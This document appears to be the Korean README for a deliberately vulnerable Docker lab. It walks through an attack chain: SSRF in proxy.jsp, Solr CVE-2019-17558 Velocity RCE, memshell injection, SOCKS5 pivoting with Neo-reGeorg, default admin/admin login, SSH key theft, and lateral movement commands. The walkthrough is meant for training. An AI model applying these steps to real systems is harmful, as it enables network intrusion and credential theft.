# Solr2Int: RED IRIS Techboard

외부 웹 애플리케이션의 SSRF 취약점을 이용해 내부 Solr 서버를 공격하고, 최종적으로 **내부망 관리자 콘솔**까지 침투하는 시나리오를 다룹니다.

## 인프라 구성

실제 기업 환경과 유사하게 **5개 네트워크 존**으로 분리된 구조입니다.

| Zone | 서비스 | IP | 역할 |
|------|--------|--------|------|
| **DMZ Zone** | dmz-web (Nginx) | 172.16.1.10 | 외부 트래픽을 받는 리버스 프록시 |
| **WAS Zone** | app-was (Tomcat 9.0) | 172.16.2.10 | 사용자 서비스 제공, `proxy.jsp` SSRF 취약점 존재 |
| **Search Zone** | search-solr (Solr 8.2.0) | 172.16.3.10 | 검색 엔진, **CVE-2019-17558** RCE 취약점 존재 |
| **DB Zone** | db-server (MySQL 5.7) | 172.16.4.10 | 뉴스/지식포털 데이터 저장 |
| **Internal Zone** | infra-monitor | 172.16.5.100 | 모니터링 서버 |

### Network Topology


```
                           ┌─────────────────┐
                           │    INTERNET     │
                           │   (Attacker)    │
                           └────────┬────────┘
                                    │ :80
                                    ▼
  ┌───────────────────────────────────────────────────────────────────┐
  │  DMZ Zone (172.16.1.0/24)                                         │
  │  ┌─────────────────────────────────────────────┐                  │
  │  │ dmz-web (Nginx) - 172.16.1.10:80            │                  │
  │  └──────────────────────────┬──────────────────┘                  │
  └─────────────────────────────┼─────────────────────────────────────┘
                                │
  ┌─────────────────────────────┼─────────────────────────────────────┐
  │  WAS Zone (172.16.2.0/24)   |                                     │
  │  ┌──────────────────────────▼──────────────────┐                  │
  │  │ app-was (Tomcat 9.0) - 172.16.2.10:8080     │                  │
  │  │ └─ proxy.jsp (SSRF)                         │                  │
  │  └──────┬──────────────────────────────┬───────┘                  │
  └─────────┼──────────────────────────────┼──────────────────────────┘
       JDBC │                              │ SSRF
  ┌─────────┼──────────────────────────────┼──────────────────────────┐
  │         │   Search Zone (172.16.3.0/24)│                          │
  │         │   ┌──────────────────────────▼─────────────────────┐    │
  │         │   │ search-solr (Solr 8.2.0) - 172.16.3.10:8983    │    │
  │         │   │ └─ CVE-2019-17558 (RCE)                        │    │
  │         │   └──────────────────┬───────────────────┬─────────┘    │
  └─────────┼──────────────────────┼───────────────────┼──────────────┘
            │                Pivot │                   │ Pivot
            ▼                      ▼                   ▼
  ┌───────────────────────────────┐  ┌────────────────────────────────┐
  │ DB Zone (172.16.4.0/24)       │  │ Internal Zone (172.16.5.0/24)  │
  │ ┌───────────────────────────┐ │  │  ┌──────────────────────────┐  │
  │ │ db-server (MySQL 5.7)     │ │  │  │ infra-monitor            │  │
  │ │ 172.16.4.10:3306          │ │  │  │ 172.16.5.100 [TARGET]    │  │
  │ └───────────────────────────┘ │  │  └──────────────────────────┘  │
  └───────────────────────────────┘  └────────────────────────────────┘

  ATTACK CHAIN:
  [1] SSRF → [2] RCE (CVE-2019-17558) → [3] Memshell → [4] Pivot → [5] Infra-Monitor
```

---

## 환경 구축

### 요구사항
- Docker & Docker Compose
- Python 3.10+

### 실행 방법
```bash
$ git clone https://github.com/oriax-swingby/solr2int && cd solr2int
$ docker-compose up --build -d
```

접속 URL: `http://localhost`

---

## 익스플로잇 스크립트

| 파일 | 설명 |
|------|------|
| `exploits/rce.py` | Velocity Template RCE 활성화 |
| `exploits/upload_jar.py` | Base64 청크로 JAR 파일 업로드 |
| `exploits/memshell.py` | URLClassLoader로 메모리에 악성 클래스 로드 |
| `exploits/Neo-reGeorg/` | SOCKS5 터널링 도구 |

---

## 공격 시나리오

### Step 1. 정보수집(Reconnaissance)
웹 애플리케이션 패킷을 분석하여 Solr 사용 여부를 확인합니다.

```bash
# Solr 버전 확인 (SSRF를 통해)
$ curl "http://localhost/proxy.jsp?path=/solr/admin/info/system"

# Core 이름 확인
$ curl "http://localhost/proxy.jsp?path=/solr/admin/cores?action=STATUS"
```

> Solr 8.2.0이 `techboard` 코어로 동작 중임을 확인할 수 있습니다.

### Step 2. 초기 침투(RCE - Remote Command Execution)
CVE-2019-17558 (Velocity Template Injection) 취약점을 트리거합니다.

```bash
$ python exploits/rce.py
```

Config API를 통해 `params.resource.loader.enabled=true`로 설정하면 Velocity 템플릿으로 명령 실행이 가능해집니다.

### Step 3. 후속 공격 1단계(Memshell Injection)
아웃바운드 연결이 차단된 환경이므로, **인 메모리 쉘**을 사용합니다.

```bash
# JAR 파일을 Base64 청크로 분할 업로드
$ python exploits/upload_jar.py

# JVM 메모리에 클래스 로드
$ python exploits/memshell.py
```

### Step 4. 후속 공격 2단계(Network Pivoting)
멤쉘을 통해 SOCKS5 터널을 생성합니다.

```bash
$ pip install requests
$ cd exploits/Neo-reGeorg
$ python neoreg.py -k key -H 'Referer:Xljumsjp' -u "http://localhost/proxy.jsp?path=/solr/techboard/" -vv
```

### Step 5. 공격 완료(내부망 침투)

SOCKS5 프록시(기본 `127.0.0.1:1080`)를 설정하고 내부망에 접근합니다.

#### 5-1. 프록시 설정
브라우저에 SOCKS5 프록시 설정:
- **Host:** `127.0.0.1`
- **Port:** `1080`

또는 `proxychains` 사용:
```bash
$ echo "socks5 127.0.0.1 1080" >> /etc/proxychains.conf
$ proxychains curl http://172.16.5.100
```

#### 5-2. Infra-Monitor 콘솔 접근
**Target:** `http://172.16.5.100` (인프라 모니터링 대시보드)

1. 로그인 페이지 접근
2. 기본 계정으로 로그인:
   - **ID:** `admin`
   - **PW:** `admin`

#### 5-3. SSH 키 획득
로그인 후 대시보드에서:
1. 우측 상단 **설정** 버튼 클릭
2. **"SSH Private Key 다운로드"** 버튼으로 `monitor_rsa.pem` 획득

#### 5-4. 내부 서버 장악 (Lateral Movement)
획득한 SSH 키로 모든 내부 서버에 접근 가능합니다.

SOCKS5 프록시를 통한 SSH 접속 (ncat 사용):

```bash
# 키 권한 설정
$ chmod 600 monitor_rsa.pem

# SSH ProxyCommand 방식 (ncat 필요: brew install nmap 또는 apt install ncat)
# Infra-Monitor 서버 접속
$ ssh -o ProxyCommand="ncat --proxy 127.0.0.1:1080 --proxy-type socks5 %h %p" \
    -i monitor_rsa.pem monitor@172.16.5.100

# DB 서버 접속 (infra-monitor 경유)
$ ssh -o ProxyCommand="ncat --proxy 127.0.0.1:1080 --proxy-type socks5 %h %p" \
    -i monitor_rsa.pem monitor@172.16.4.10

# Solr 서버 접속
$ ssh -o ProxyCommand="ncat --proxy 127.0.0.1:1080 --proxy-type socks5 %h %p" \
    -i monitor_rsa.pem monitor@172.16.3.10

# WAS 서버 접속
$ ssh -o ProxyCommand="ncat --proxy 127.0.0.1:1080 --proxy-type socks5 %h %p" \
    -i monitor_rsa.pem monitor@172.16.2.10

# DMZ 서버 접속
$ ssh -o ProxyCommand="ncat --proxy 127.0.0.1:1080 --proxy-type socks5 %h %p" \
    -i monitor_rsa.pem monitor@172.16.1.10
```

> **공격 성공!** 모니터링 솔루션 계정(`monitor`)으로 전체 내부 인프라 장악 완료

---

## 트러블슈팅

문제 발생 시 [TROUBLESHOOTING.md](./TROUBLESHOOTING.md) 참고

---

## License

This project is for educational purposes only.


